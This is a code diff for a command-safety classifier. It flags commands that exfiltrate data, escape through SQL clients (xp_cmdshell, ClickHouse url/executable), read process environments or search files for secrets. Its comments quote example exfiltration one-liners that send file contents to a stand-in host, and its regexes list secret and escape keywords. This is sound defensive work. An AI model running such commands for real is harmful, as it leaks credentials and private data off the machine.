@@ -42,7 +42,7 @@ type OS = ClassifyContext["os"];
 /** A `..` segment in a POSIX path. */
 const DOT_DOT = /(^|\/)\.\.(\/|$)/;
 /** How a script is read that the kernel or a POSIX shell opens by the name as written (`..` walked through links). */
-const POSIX_OPENERS: ReadonlySet<string> = new Set(["sh", "bash", "zsh", "shebang"]);
+const POSIX_OPENERS: ReadonlySet<string> = new Set(["sh", "bash", "zsh", "shebang", "psql", "mysql", "sqlite", "sqlcmd", "clickhouse", "sed", "awk", "code"]);
 /** The card's words for a script whose path has a `..` the target couldn't resolve (L25). */
 export const SCRIPT_UNSURE = "Ember can't tell which script this runs.";
 
@@ -139,6 +139,11 @@ export interface ClassificationExtra extends Classification {
   /** Of those, the writes Ember can't place that no finding stands for (a checkout's work tree, an archive unpacked). */
   writesUnplaced?: boolean;
   /**
+   * The patch files it applies (`git apply a.patch`, `patch -p1 < a.diff`), absolute: one the task wrote makes what it
+   * changes the task's own writing too (TaskWrites.ownAnywhere, r10-commands-x10-6).
+   */
+  patches?: string[];
+  /**
    * The line sets a variable (but a `for` list's or a read's own, judged apart), changes the folder, its options or
    * positional words, or sources or execs (shellStateChanged): its commands are judged in the folder and with the values
    * the line starts with, so withoutReadFlow keeps an if's own words, as main did (commands-b7-1, b7-3). A loop's words it
@@ -165,9 +170,12 @@ export interface ScriptRef {
   path: string;
   /**
    * How to read its text: a POSIX shell, PowerShell, cmd, or "shebang" (run directly: the `#!` line names the
-   * interpreter, and a text file without one is run by the calling shell).
+   * interpreter, and a text file without one is run by the calling shell); a database client's SQL ("psql", "mysql",
+   * "sqlite", "sqlcmd", "clickhouse": judged as that client's own text, commands-remote-r10-4, r10-commands-x10-2); a sed or awk program file
+   * ("sed", "awk": judged as `-e`'s or the program's text, r10-commands-x10-6); or "code", a program in a language Ember
+   * doesn't read (Python, Node, Ruby…), which asks only when the task wrote it (commands-remote-r10-9).
    */
-  as: "sh" | "bash" | "zsh" | "powershell" | "cmd" | "shebang";
+  as: "sh" | "bash" | "zsh" | "powershell" | "cmd" | "shebang" | "psql" | "mysql" | "sqlite" | "sqlcmd" | "clickhouse" | "sed" | "awk" | "code";
   /** The folder it runs in (its relative paths resolve there, not beside the script); "" when unknown. */
   cwd: string;
   /**
@@ -186,6 +194,12 @@ export interface ScriptRef {
    * the project's tooling and is judged as before the closed default, as the script itself is (commands-closed-x9-4).
    */
   project?: true;
+  /**
+   * A file the program runs without being named as its script (a Makefile, package.json, a package's __main__.py, a
+   * preloaded module): only a write that names it makes it this command's own, never one Ember can't name (`git pull
+   * && make` and a build.sh whose make writes files runs as before: r10-commands-y10-5).
+   */
+  implied?: true;
 }
 
 /** The administrator's policy key (HKLM\SOFTWARE\Policies\Ember, in any spelling of the hive), refused (D4.5). */
@@ -415,8 +429,20 @@ class Classifier {
   /** Whether the refusal is only for reading Ember's own files (a later change or input refusal says more). */
   private refusedRead = false;
   downloads: string[] = [];
+  /**
+   * Where a bare `exec > file` sends the shell's output from then on: what a later fetch on the line prints lands
+   * there, so it is a download (commands-remote-r10-5).
+   */
+  execOut: Arg[] = [];
   /** Of `downloads`, those to drop when the target says they are a folder (ClassificationExtra.downloadsIfFile). */
   downloadsIfFile: string[] = [];
+  /** The patch files the line applies (ClassificationExtra.patches). */
+  patches: string[] = [];
+  /** Notes a patch file the line applies (git apply, patch): absolute on the target. */
+  notePatch(a: Arg, sc: Scope): void {
+    if (a.v === null || a.v === "-" || STDIN_NAME.test(a.v) || (!isAbsolute(a.v, sc.path.flavour) && !a.v.startsWith("~") && !sc.cwd)) return;
+    this.patches.push(resolveTargetPath(a.v, { os: sc.os, home: sc.home ?? "", cwd: sc.cwd ?? "" }));
+  }
   needsGit = false;
   programs: string[] = [];
   windowsReach = false;
@@ -1217,6 +1243,13 @@ class Classifier {
    * beside that. A pattern, a stream (`/dev/fd/3`, `/proc/self/fd/0`) or more scripts than Ember reads (MAX_SCRIPTS)
    * asks: what would run can't be read first.
    */
+  /** recordScript for a file a program runs without naming it as its script (ScriptRef.implied). */
+  recordImplied(a: Arg, sc: Scope): void {
+    const before = this.scripts.length;
+    this.recordScript(a, "code", sc);
+    if (this.scripts.length > before) this.scripts[this.scripts.length - 1].implied = true;
+  }
+
   recordScript(a: Arg, as: ScriptRef["as"], sc: Scope, candidate = false): void {
     if (a.v === null || a.v === "-" || a.v === "/dev/stdin" || sc.foreign) return;
     if (a.glob) { this.unclear("unclear.script-pattern", "It runs a script named by a pattern, which Ember can't read first."); return; }
@@ -1272,6 +1305,7 @@ class Classifier {
       const hit = (w: { p: string; env: PathEnv }) => names.some(n => isUnder(n, w.p, w.env));
       const snap = this.candidates.get(r);
       if (snap) return snap.unnamed || this.written.slice(0, snap.written).some(hit);
+      if (r.implied) return this.written.some(hit);
       return this.writesUnnamed || this.written.some(hit);
     });
   }
@@ -1712,6 +1746,30 @@ function substituted(raw: string): string[] {
   }
   return out;
 }
+/**
+ * The text inside each outermost parenthesised expression or subexpression of a PowerShell argument (`("a" + (gc x))`,
+ * `"…$(gc x)…"`, `$((gc x))`), outside single quotes: what PowerShell computes and hands over (commands-remote-r10-3).
+ */
+function psInner(raw: string): string[] {
+  const text = raw.replace(/'[^']*'/g, "");
+  const out: string[] = [];
+  for (let k = 0; k < text.length; k++) {
+    if (text[k] !== "(") continue;
+    let depth = 1;
+    let j = k + 1;
+    for (; j < text.length && depth > 0; j++) depth += text[j] === "(" ? 1 : text[j] === ")" ? -1 : 0;
+    out.push(text.slice(k + 1, depth === 0 ? j - 1 : text.length));
+    k = j - 1;
+  }
+  return out;
+}
+/**
+ * PowerShell cmdlets outside FETCHERS that send what an argument computes: BITS fetches a `-Source` address, and a mail
+ * carries its body and subject (r10-commands-x10-3).
+ */
+const PS_SENDERS: ReadonlySet<string> = new Set(["start-bitstransfer", "send-mailmessage"]);
+/** A PowerShell sender's parameters that only say where its answer goes or how it sends: never what it sends. */
+const PS_SEND_LOCAL = new Set(["outfile", "destination", "outvariable", "ov", "sessionvariable", "sv", "timeoutsec", "method", "contenttype", "maximumredirection", "maximumretrycount", "retryintervalsec", "erroraction", "ea", "errorvariable", "ev", "warningaction", "wa", "informationaction", "infa", "pipelinevariable", "pv", "outbuffer", "ob"]);
 /** Programs whose output only says the machine's kind, the time, a version, or what another fetch returned. */
 const SAYS_LITTLE = new Set(["uname", "date", "arch", "nproc", "getconf", "lsb_release", "dpkg", "rpm", "hostname", "whoami", "id", "curl", "wget", "echo", "printf", "mktemp", "sw_vers", "go", "rustc", "node", "python3", "python"]);
 /** The words of a fetch that only gets a web address: the address, and the options that take no value and name no file. */
@@ -2443,6 +2501,7 @@ class Engine extends Classifier {
       // command), writes where it likes once the user says yes.
       writesAnywhere: this.unnamedAnywhere || this.findings.some(f => f.cls === "unclear" || f.cls === "escape"),
       writesUnplaced: this.unnamedAnywhere,
+      ...(this.patches.length ? { patches: [...new Set(this.patches)] } : {}),
       holdsFlow: this.setsVars || this.commands.some(changesShellState),
       ...(this.downloadsIfFile.length ? { downloadsIfFile: this.downloadsIfFile } : {}),
     };
@@ -3285,6 +3344,13 @@ class Engine extends Classifier {
     const files = !n ? (ORDINARY_VERBS[key] ?? ORDINARY_VERBS[unversioned(key)])?.files : key === "bun" ? /\.(m|c)?(j|t)sx?$/i : undefined;
     const script = files ? args.find(a => a.v !== null && !a.v.startsWith("-") && files.test(a.v)) : undefined;
     if (script) handedToScript(h, script);
+    // Its source is code Ember doesn't read: one the task wrote asks (judgeScripts; `tsx a.ts`, `bun a.ts`, `dart a.dart`:
+    // r10-commands-x10-6). A .dll is a program, built or given.
+    if (script && !/\.dll$/i.test(script.v ?? "")) this.recordScript(script, "code", h.sc);
+    // java runs a single source file by its name (`java a.java`), and pytest loads conftest.py from its folder and the
+    // test files it is given (r10-commands-x10-6).
+    if (key === "java") { const src = args.find(a => a.v !== null && !a.v.startsWith("-") && /\.java$/i.test(a.v)); if (src) this.recordScript(src, "code", h.sc); }
+    if (key === "pytest" || key === "py.test") pytestCode(h, args);
     // A deleter that had no row before commands-remote-c8-2 keeps an unknown program's `-o` (commands-remote-x8-5),
     // and so does toybox (commands-closed-y9-1).
     optionPaths(h, !n || UNKNOWN_OPTIONS.has(key));
@@ -3570,11 +3636,14 @@ class Engine extends Classifier {
     }
     if (s.fetchBefore || fetches(key) || carried || s.fetched === true) {
       for (const r of s.redirs) if ((r.kind === "write" || r.kind === "append") && r.target?.v) this.download(r.target.v, shellSc);
+      // What it prints into a file a bare `exec >` opened (commands-remote-r10-5).
+      for (const t of this.execOut) if (t.v) this.download(t.v, shellSc); else this.downloadTo(t, shellSc);
       if (/^(tee|tee-object|out-file|set-content|add-content|sponge)$/.test(key)) {
         for (const a of args) if (a.v !== null && a.param === undefined && !isOption(a) && !NULL_SINKS.has(a.v.toLowerCase())) this.download(a.v, sc);
       }
       if (key === "dd") for (const a of args) { const m = a.v === null ? null : /^of=(.+)$/.exec(a.v); if (m && !NULL_SINKS.has(m[1].toLowerCase())) this.download(m[1], sc); }
     }
+    fetchToolSaves(this, key, args, sc);
     const ownEnd = this.downloads.length;
     // A compiler builds a program from a downloaded source: the file it writes is the download too, so running it later
     // asks (commands-remote-r8-2). Carried to `-o`/`-oX` (gcc, rustc), else the default output: `a.out` for a cc-family
@@ -3741,6 +3810,10 @@ class Engine extends Classifier {
     // A short option with its value attached, a long one after `=`, and cmd's `/x:value`.
     const short = /^-[A-Za-z](.+)$/.exec(word);
     if (short) texts.push(short[1]);
+    // In a cluster, any of its letters may be the option whose value the rest is (`make -kCr` is `-k -C r`, GNU-style):
+    // each tail after a letter, so a flag before the value hides nothing (commands-remote-r10-2).
+    const cluster = /^-[A-Za-z0-9]+/.exec(word);
+    if (cluster) for (let k = 3; k < word.length && k <= cluster[0].length; k++) texts.push(word.slice(k));
     const slash = /^\/[A-Za-z?]+:(.+)$/.exec(word);
     if (slash) texts.push(slash[1]);
     return texts.some(t => parts(t).some(hit));
@@ -3789,7 +3862,7 @@ class Engine extends Classifier {
   private sendsContents(key: string, args: readonly Arg[], s: Simple): void {
     if (this.asMain) return;
     const says = "May send what a file or a command holds to another computer.";
-    if (!FETCHERS.has(key)) {
+    if (!FETCHERS.has(key) && !PS_SENDERS.has(key)) {
       // Any other program given a web address that holds what a command or a read gave sends it as well (`git
       // ls-remote "https://x.io/$(cat notes.txt)"`, `pip download …`: commands-classes-y9-6).
       const { own: words } = this.ownWords(args);
@@ -3803,6 +3876,20 @@ class Engine extends Classifier {
     const filled = (name: string): boolean => (this.varValues.get(name) ?? []).some(f => f.includes(UNSEEN)) || this.loopVars.get(name) === "read"
       || (this.psVarValues.get(name.toLowerCase().replace(/^(script|global|local|private|using):/, "")) ?? []).some(f => f.includes(UNSEEN));
     let hit = /^(http|https|xh|xhs)$/.test(key) && s.stdin === "file";
+    // PowerShell: an argument that is, or holds, a parenthesised expression or a subexpression (`-Uri ("…" + (gc
+    // notes.txt -Raw))`, `-UserAgent (gc notes.txt)`, `"…$((gc notes.txt))"`) gives the request what it computes,
+    // unless it only names where the answer goes or how to send it (commands-remote-r10-3).
+    if (s.ps) {
+      let param = "";
+      for (const a of s.ps.args) {
+        if (a.kind === "param" && !a.attached) { param = (a.param ?? "").toLowerCase(); continue; }
+        const own = a.kind === "param" ? (a.param ?? "").toLowerCase() : param;
+        param = "";
+        if (a.subs.length === 0 || PS_SEND_LOCAL.has(own)) continue;
+        // Literals joined (`("https://x.io/" + "v1")`) compute nothing that reads.
+        if (psInner(a.raw).some(inner => inner.replace(/"[^"$`]*"/g, "").replace(/[\s+()\d]/g, "") !== "" && !saysLittle(inner))) hit = true;
+      }
+    }
     const { own } = this.ownWords(args);
     for (let k = 0; k < args.length && !hit; k++) {
       const a = args[k];
@@ -4248,6 +4335,46 @@ function runners(): ReadonlySet<string> {
  * An unknown program: its operands read as paths; an operand naming a program may mean it runs it. With `noRow` (a
  * program with no row at all, not a row's own fallback such as busybox's or sponge's), a broad folder asks too.
  */
+/**
+ * Whether ps is asked for other programs' environments (passwords and tokens they were started with): BSD's `e`
+ * (`ps eww`, `ps auxe`, `ps -ef e`), macOS's `-E`, or the `env`/`environ` keyword in a format (`-o pid,env`,
+ * `-eo pid,environ`, `o env`). Option values (`-C chrome`, `U ana`, `-p 1`) are skipped; a value Ember can't see may
+ * name one (commands-remote-r10-6).
+ */
+function psShowsEnv(args: readonly Arg[]): boolean {
+  const FORMAT = /(^|[\s,])(env|environ)(=|[\s,:]|$)/i;
+  let format = false;
+  let skip = false;
+  for (const a of args) {
+    const v = a.v;
+    if (skip) { skip = false; if (format && (v === null || FORMAT.test(v))) return true; format = false; continue; }
+    if (v === null) continue;
+    if (v.startsWith("--")) {
+      const [name, value] = [v.split("=")[0], v.includes("=") ? v.slice(v.indexOf("=") + 1) : undefined];
+      const isFormat = /^--(format|forma|form|o)$/.test(name);
+      if (value !== undefined) { if (isFormat && FORMAT.test(value)) return true; continue; }
+      if (/^--(format|sort|pid|ppid|user|group|cols|columns|rows|tty|sid|quick-pid|width|context)$/.test(name)) { skip = true; format = isFormat; }
+      continue;
+    }
+    const dash = v.startsWith("-");
+    const letters = dash ? v.slice(1) : v;
+    if (!/^[A-Za-z]/.test(letters)) continue;
+    // A cluster's value option takes the rest of the word, or the next word.
+    const valueLetters = dash ? "oOpqtuUgGCsk" : "oOptUkq";
+    for (let j = 0; j < letters.length; j++) {
+      const c = letters[j];
+      if (dash ? c === "E" : c === "e") return true;
+      if (valueLetters.includes(c)) {
+        const rest = letters.slice(j + 1);
+        const isFormat = c === "o" || c === "O";
+        if (rest) { if (isFormat && FORMAT.test(rest)) return true; } else { skip = true; format = isFormat; }
+        break;
+      }
+    }
+  }
+  return false;
+}
+
 function generic(h: H, noRow = false): void {
   const k = h.key;
   if (INPUT_SYNTH.has(k)) { h.e.refuseWith("ember.input", "input"); return; }
@@ -4257,6 +4384,7 @@ function generic(h: H, noRow = false): void {
   if (INTERACTIVE.has(k)) interactive(h);
   if (LAUNCHERS.has(k)) { launcher(h); return; }
   if (SECRET_PROGRAMS.has(k)) h.e.add("secret", "secret.program", SAYS.secrets);
+  if (k === "ps" && psShowsEnv(h.args)) h.e.add("secret", "secret.env", SAYS.env);
   if (CLIPBOARD_READERS.has(k)) h.e.add("secret", "secret.clipboard", SAYS.clipboard);
   if (SCREENSHOTTERS.has(k)) h.e.add("secret", "secret.screen", SAYS.screen);
   if (RECORDERS.has(k)) h.e.add("secret", "secret.record", SAYS.records);
@@ -5135,8 +5263,14 @@ const PS_READ_VERBS = new Set(["get", "find", "search", "select", "measure", "te
 const PS_ORDINARY_VERBS = new Set(["get", "test", "measure", "select", "where", "sort", "group", "format", "convertto", "convertfrom", "compare", "resolve", "split", "join"]);
 /** Cmdlets with other verbs that only show progress, wait or search the gallery (commands-closed-y9-7). */
 const PS_ORDINARY_CMDLETS = new Set(["write-progress", "wait-process", "find-module"]);
+/**
+ * Cmdlets that look a name up or reach another computer by it: given a name Ember can't read, what goes into the name
+ * leaves the computer, as with dig and ping (commands-remote-r10-3).
+ */
+const PS_NAME_LOOKUPS = new Set(["resolve-dnsname", "test-connection", "test-netconnection", "test-computersecurechannel"]);
 function unknownCmdlet(h: H): void {
   const verb = h.key.split("-")[0];
+  if (PS_NAME_LOOKUPS.has(h.key) && h.args.some(a => a.v === null)) h.e.unclear("unclear.unresolved-arg", `Ember can't tell which arguments ${h.prog} gets.`);
   if (!PS_READ_VERBS.has(verb)) h.e.unclear("unclear.cmdlet", `Ember can't tell what ${h.prog} changes.`);
   else if (!PS_ORDINARY_VERBS.has(verb) && !PS_ORDINARY_CMDLETS.has(h.key) && !h.e.readsAsMain) h.e.add("unknown", "unknown.program", SAYS.unknownProgram);
   // One whose noun names a secret, or that prints one as plain text, hands it to the output whatever its verb
@@ -5292,6 +5426,12 @@ reg(NATIVE, ["ls", "ll", "dir", "vdir", "tree", "du", "stat", "file", "lsd", "ex
     if (obj.abs === null) h.e.unclear("unclear.unresolved-arg", `Ember can't tell which arguments ${h.prog} gets.`);
   }
 });
+/** A word of a search pattern that names a secret: what it finds is the secret's line (commands-remote-r10-6). */
+const SECRET_WORD = /passw(or)?d|passphrase|secret|token|api[_-]?key|private[_ -]?key|credential|[_-]pass\b|\bpass[_-]|bearer|BEGIN [A-Z ]*PRIVATE/i;
+/** A search whose pattern names a secret, or one Ember can't see: it asks as a secret. */
+function secretSearch(h: H, patterns: readonly Arg[]): void {
+  if (patterns.some(a => a.v !== null && !isOption(a) && SECRET_WORD.test(a.v))) h.e.add("secret", "path.secret", "Searches files for passwords, keys or other secrets.");
+}
 // grep and friends: a recursive search reads every file under its folders (secrets included unless hidden files are skipped).
 reg(NATIVE, ["grep", "egrep", "fgrep", "rg", "ag", "ack", "ugrep", "git-grep"], h => {
   // git grep's and ugrep's pager value is optional and only follows `=`: written alone, the option takes the default
@@ -5324,6 +5464,10 @@ reg(NATIVE, ["grep", "egrep", "fgrep", "rg", "ag", "ack", "ugrep", "git-grep"], 
   const patternGiven = values(p, "e", "regexp", "f", "file", ...(h.key === "ack" ? ["match"] : [])).length > 0;
   for (const f of values(p, "f", "file")) if (f) h.e.usePath(lit(f), "read", h.sc);
   const files = patternGiven ? p.operands : p.operands.slice(1);
+  // A search of files for a secret's word prints the lines that hold one (commands-remote-r10-6).
+  if (files.length > 0 || h.key === "rg" || h.key === "ag" || h.key === "ack" || h.args.some(a => /^-[A-Za-z]*[rR]|^--(recursive|dereference-recursive)$/.test(a.v ?? ""))) {
+    secretSearch(h, patternGiven ? values(p, "e", "regexp").map(v => (v === null ? { v: null, raw: "?", glob: false } : lit(v))) : p.operands.slice(0, 1));
+  }
   const hiddenToo = h.key === "grep" || h.key === "egrep" || h.key === "fgrep" || h.key === "ack" || h.key === "ugrep" || has(p, "hidden", "u", "uu", "uuu", "unrestricted", "a", "all-types", "no-ignore");
   const recursive = h.key === "rg" || h.key === "ag" || h.key === "ack" || has(p, "r", "R", "recursive", "dereference-recursive") || values(p, "d", "directories").includes("recurse");
   const use: PathUse = recursive && hiddenToo ? "readTree" : "read";
@@ -5401,18 +5545,24 @@ function inlineSql(h: H, short: string[], long: string[]): (string | null)[] {
  */
 function sqlFromStdin(h: H, client?: SqlClient): void {
   if (h.s.stdin === "pipe" || h.s.stdin === "heredoc") fromStdin(h, t => databaseText(h, [t], client));
-  else if (h.s.stdin === "file") stdinFile(h);
+  else if (h.s.stdin === "file") stdinFile(h, client);
 }
 
 /**
  * A file a database client runs from its input (`psql app < drop_users.sql`, `redis-cli < cmds.txt`): judged by its
- * name, as `psql -f` is, and one this task downloaded asks (commands-remote-c5-3).
+ * name, as `psql -f` is, and one this task downloaded asks (commands-remote-c5-3). A client whose SQL Ember reads has
+ * the file read first and judged as its own text (commands-remote-r10-4).
  */
-function stdinFile(h: H): void {
+function stdinFile(h: H, client?: SqlClient): void {
   for (const r of h.s.redirs) {
     if (r.kind !== "read" || !r.target) continue;
     if (h.e.isDownloaded(r.target, h.sc)) h.e.add("escape", "escape.run-downloaded", SAYS.runsDownloaded);
     else if (r.target.v) nameCheck(h, r.target.v);
+    // A client whose commands Ember doesn't read (redis-cli, mongosh) runs the file as code: one the task wrote asks, as
+    // a Python script it wrote does (r10-commands-y10-3).
+    if (client === undefined) { if (r.target.v !== null && !STREAM_NAME.test(r.target.v)) h.e.recordScript(r.target, "code", h.sc); continue; }
+    if (r.target.v === null) h.e.unclear("unclear.sql", "It runs database commands from a file Ember can't name.");
+    else if (!STREAM_NAME.test(r.target.v)) h.e.recordScript(r.target, client, h.sc);
   }
 }
 
@@ -5429,8 +5579,11 @@ function redisCommand(h: H, words: readonly (string | null)[]): void {
   if (cmd === "config" && /^(set|rewrite|resetstat)$/i.test(words[1] ?? "")) h.e.add("system", "system.kernel", "Changes how the system works.");
 }
 
-/** The clients whose own commands Ember reads (clientCommands): psql's `\x`, sqlite3's and duckdb's `.x`, mysql's words. */
-type SqlClient = "psql" | "sqlite" | "mysql";
+/**
+ * The clients whose own commands Ember reads (clientCommands): psql's `\x`, sqlite3's and duckdb's `.x`, mysql's words,
+ * sqlcmd's `!!` and `:` commands with T-SQL's ways out, and ClickHouse's table functions (r10-commands-x10-2).
+ */
+type SqlClient = "psql" | "sqlite" | "mysql" | "sqlcmd" | "clickhouse";
 
 const SAYS_CLIENT = "It runs database client commands that can run programs or write files.";
 /**
@@ -5444,6 +5597,13 @@ const SQLITE_SHOWS = new Set([
 ]);
 /** SQL functions of sqlite3's shell that read or write files, load code or open an editor. */
 const SQLITE_FUNCTIONS = /\b(load_extension|writefile|readfile|edit|fts3_tokenizer)\s*\(/i;
+/**
+ * T-SQL that runs a program, reaches files or other servers, or runs text Ember can't see (`EXEC xp_cmdshell`,
+ * `OPENROWSET`, `BULK INSERT`, dynamic `EXEC('…')`, `sp_executesql`): r10-commands-x10-2.
+ */
+const TSQL_ESCAPE = /\b(xp_\w+|sp_oa\w+|sp_configure|sp_execute_external_script|sp_executesql|sp_addextendedproc|openrowset|opendatasource|openquery|bulk\s+insert)\b|\bexec(ute)?\s*\(/i;
+/** ClickHouse's table functions that read or write files, URLs, other servers or a program's output (`url(…)`, `executable(…)`). */
+const CLICKHOUSE_ESCAPE = /\b(url|file|executable|executablepool|remote|remotesecure|s3|s3cluster|gcs|azureblobstorage|azureblobstoragecluster|hdfs|hdfscluster|mysql|postgresql|mongodb|redis|jdbc|odbc|sqlite|cluster|clusterallreplicas|deltalake|hudi|iceberg|input)\s*\(|\b(from\s+infile|into\s+outfile)\b/i;
 /** psql's backslash commands that only describe, show or set how results look (`\dt+`, `\l`, `\x`, `\timing`). */
 const PSQL_SHOWS = /^(d[A-Za-z]*\+?|l\+?|x|a|t|H|q|z|h|\?|timing|pset|echo|qecho|warn|conninfo|encoding|set|unset|C|f|T|sf\+?|sv\+?|errverbose|crosstabview|p|r|reset|print|if|elif|else|endif)$/;
 
@@ -5513,6 +5673,19 @@ function clientCommands(h: H, client: SqlClient, t: string): void {
       if (m.name === "!") clientShell(h, m.rest);
       else clientWords(h, m.rest);
     }
+  } else if (client === "sqlcmd") {
+    // sqlcmd's own commands start a line: `!!` runs the rest through the shell, `:r` reads a file in, `:out` writes
+    // one, and any other (`:connect`, `:setvar`, `:ed`) asks (r10-commands-x10-2).
+    for (const line of t.split("\n")) {
+      const m = /^\s*(!!|:!!|:([A-Za-z]+))[ \t]*(.*)$/.exec(line);
+      if (!m) continue;
+      const name = (m[2] ?? "").toLowerCase();
+      if (m[1] === "!!" || m[1] === ":!!") clientShell(h, m[3]);
+      else clientWords(h, m[3], name === "r" ? "read" : "write");
+    }
+    if (TSQL_ESCAPE.test(t)) h.e.unclear("unclear.sql", SAYS_CLIENT);
+  } else if (client === "clickhouse") {
+    if (CLICKHOUSE_ESCAPE.test(t)) h.e.unclear("unclear.sql", SAYS_CLIENT);
   } else {
     // A client word starts a statement: after `;`, or on a line of its own (`use app` ends at its line: x7-7).
     for (const m of t.matchAll(/(?:^|;)\s*(source|tee|pager|edit|system)\b[ \t]*([^;\n]*)|\\([.!TPe])[ \t]*([^;\n\\]*)/gim)) {
@@ -5552,16 +5725,44 @@ reg(NATIVE, ["psql", "sqlite3", "sqlite", "duckdb", "sqlcmd", "cqlsh", "clickhou
     }
     // SQL read from stdin or a here-document (`psql <<< '\! id'`, `psql -f - <<< …`): judge the seen text, else ask;
     // a file given as another descriptor (`-f /dev/fd/3`) can't be read first (review #166).
-    const files = inlineSql(h, ["f"], ["file"]);
+    // A file given in a cluster (`-1f a.sql`, `-qfa.sql`, `-Xqf a.sql`) is read as getopt reads it (r10-commands-y10-2).
+    const files = [...new Set([...inlineSql(h, ["f"], ["file"]), ...values(p, "f", "file")])];
     if (files.some(f => f !== null && STDIN_NAME.test(f)) || (!inlineSql(h, ["c"], ["command"]).length && !files.length)) sqlFromStdin(h, "psql");
     if (files.some(f => f !== null && !STDIN_NAME.test(f) && STREAM_NAME.test(f))) h.e.unclear("unclear.script-stream", SAYS.scriptStream);
     // A SQL script this task downloaded, run with -f, is download-and-run (its `\!`, `COPY … FROM PROGRAM` run code):
     // commands-remote-r8-2.
     if (files.some(f => f !== null && !STDIN_NAME.test(f) && !STREAM_NAME.test(f) && h.e.isDownloaded(lit(f), h.sc))) h.e.add("escape", "escape.run-downloaded", SAYS.runsDownloaded);
+    // Its SQL is read first and judged as `-c`'s text would be (commands-remote-r10-4); one Ember can't name asks.
+    for (const f of files) {
+      if (f === null) h.e.unclear("unclear.sql", "It runs database commands from a file Ember can't name.");
+      else if (!STDIN_NAME.test(f) && !STREAM_NAME.test(f)) h.e.recordScript(lit(f), "psql", h.sc);
+    }
   }
-  else if (k === "sqlcmd") databaseText(h, inlineSql(h, ["Q", "q"], []));
-  else if (k === "cqlsh") databaseText(h, inlineSql(h, ["e"], ["execute"]));
-  else if (k === "clickhouse-client") databaseText(h, inlineSql(h, ["q"], ["query"]));
+  else if (k === "sqlcmd" || k === "clickhouse-client") {
+    // Each judged in its own dialect: sqlcmd's `!!` and `:r`, T-SQL's xp_cmdshell, ClickHouse's url() and file()
+    // (r10-commands-x10-2).
+    const client: SqlClient = k === "sqlcmd" ? "sqlcmd" : "clickhouse";
+    // sqlcmd's clusters (`-Ii a.sql`, `-IQ "…"`) are read as getopt reads them, its optional-value letters (k, r, X, N)
+    // taken as flags so no letter after them is missed (r10-commands-y10-2).
+    const sq = k === "sqlcmd" ? opts(h, { shortValue: "SUPdHlthswaioQqvfcmVKyYzZ" }) : null;
+    const inline = k === "sqlcmd" ? [...new Set([...inlineSql(h, ["Q", "q"], []), ...values(sq!, "Q", "q")])] : inlineSql(h, ["q"], ["query"]);
+    databaseText(h, inline, client);
+    // The SQL files they run (sqlcmd's -i, clickhouse-client's --queries-file) are read first and judged as SQL, as
+    // psql's -f is (commands-remote-r10-4); one Ember can't name asks.
+    const files = k === "sqlcmd" ? [...new Set([...inlineSql(h, ["i"], ["input-file"]), ...values(sq!, "i")])] : inlineSql(h, [], ["queries-file"]);
+    for (const f of files) {
+      if (f === null) h.e.unclear("unclear.sql", "It runs database commands from a file Ember can't name.");
+      else if (!STDIN_NAME.test(f) && !STREAM_NAME.test(f)) h.e.recordScript(lit(f), client, h.sc);
+    }
+    // What they read from their input (`clickhouse-client < a.sql`, `sqlcmd <<< …`) is judged the same way.
+    if (!inline.length && !files.length) sqlFromStdin(h, client);
+  }
+  else if (k === "cqlsh") {
+    databaseText(h, inlineSql(h, ["e"], ["execute"]));
+    // The CQL file it runs, which Ember doesn't read: one the task wrote asks (r10-commands-y10-3).
+    for (const f of inlineSql(h, ["f"], ["file"])) if (f !== null && !STDIN_NAME.test(f) && !STREAM_NAME.test(f)) h.e.recordScript(lit(f), "code", h.sc);
+    if (h.s.stdin === "file") stdinFile(h);
+  }
   else if (k === "sqlite3" || k === "sqlite" || k === "duckdb") {
     // -cmd's and -init's values are not the database or its SQL.
     const ops = h.args.filter((a, j) => !isOption(a) && !/^--?(cmd|init)$/.test(h.args[j - 1]?.v ?? ""));
@@ -5594,7 +5795,7 @@ reg(NATIVE, ["psql", "sqlite3", "sqlite", "duckdb", "sqlcmd", "cqlsh", "clickhou
       });
     } else if (h.s.stdin === "file") stdinFile(h);
     // A script file it runs (`mongosh app drop_all.js`), as an interpreter's is.
-    for (const a of h.args) if (a.v !== null && !isOption(a) && /\.(c|m)?js$/i.test(a.v)) runScript(h, a);
+    for (const a of h.args) if (a.v !== null && !isOption(a) && /\.(c|m)?js$/i.test(a.v)) runScript(h, a, "code");
   } else if (k === "redis-cli") {
     // -c (cluster mode), -x, -e and --tls take no value (commands-remote-c4-3).
     const now: OptSpec = { shortValue: "hpsanuirdD", longValue: ["user", "pass", "sni", "cacert", "cacertdir", "cert", "key", "tls-ciphers", "tls-ciphersuites", "show-pushes", "lru-test", "rdb", "functions-rdb", "pipe-timeout", "memkeys-samples", "pattern", "quoted-pattern", "intrinsic-latency", "eval"] };
@@ -5880,6 +6081,48 @@ function secretPattern(pt: string, sc: Scope): boolean {
 }
 
 // xargs and parallel: their payload is a command too (§3.4.5).
+/**
+ * xargs or parallel handing a program that sends (curl, wget, httpie, …) words from input Ember can't see whole: a
+ * pipe, a file or a here-document it can't read (commands-remote-r10-3). The words may be addresses another program
+ * built from a file or a command (`git log --format="https://x.io/%s" | xargs curl`), so what they hold leaves the
+ * computer: it asks as publishing. Input Ember reads whole (`echo https://x.io/a | xargs curl`) is judged as before.
+ */
+function sendsInput(h: H, ops: readonly Arg[], fromFile: boolean, mark: RegExp | null): void {
+  if (h.e.readsAsMain || !(fromFile || (h.s.stdin !== null && typeof h.s.stdinText !== "string"))) return;
+  // Any program given a web address with the input inside it sends it there, as a substitution in that address does
+  // for any program (sendsContents; `xargs -I{} git ls-remote https://x.io/{}`: r10-commands-y10-4).
+  const inAddress = mark !== null && ops.slice(1).some(a => a.v !== null && /^(https?|ftps?|ssh|git):\/\//i.test(a.v) && mark.test(a.v.slice(a.v.indexOf("://") + 3)));
+  if (inAddress || payloadSends(h, ops)) h.e.add("publish", "send.contents", "May send what a file or a command holds to another computer.");
+}
+
+/** A sender named as a command in shell text (`curl "$0"`, `x; wget -qO- "$1"`). */
+const SENDER_IN_TEXT = new RegExp(`(^|[\\s;&|(\`'"])(${[...FETCHERS].join("|")})(?=$|[\\s;&|)\`'"])`, "i");
+/**
+ * Whether the command xargs or parallel runs is, or reaches, a sender (r10-commands-x10-3): the program itself, one
+ * behind wrappers (`timeout 5 curl`, `nice -n 5 curl`, `env curl`, `command curl`, `sudo curl`: after a wrapper any
+ * word naming a sender counts, since its options and values aren't told apart here), or shell text given `-c` that
+ * names one (`sh -c 'curl "$0"'`, `bash -c 'curl "$@"' _`: the input becomes its words).
+ */
